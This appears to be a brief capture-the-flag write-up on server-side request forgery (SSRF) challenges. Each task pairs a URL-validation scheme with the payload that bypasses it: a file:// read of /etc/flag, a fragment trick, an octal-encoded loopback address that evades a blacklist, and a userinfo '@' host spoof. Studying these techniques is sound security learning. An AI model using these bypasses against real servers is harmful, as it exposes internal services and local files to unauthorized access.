## Base idea:
Try different input to learn what validation is used. After we found out how to bypass it.

## Tasks:

### Simple SSRF
no filter

urlopen(input)

solution: file:///etc/flag

### SSRF v2
validation:
if 'http' in input_str:
    input = "http://" + input
urlopen(input)

solution file:///etc/flag#http

### SSRF v3
function: HTTPConnectionPool
=>  we can't use "file://"
+ we can't use "127.0.0.1", because we have black-list filter

solution: http://017700000001:8000

### VK Checker
solution http://vk.com@127.0.0.1:8000#vk.com/safds

#### Resources:
https://portswigger.net/web-security/ssrf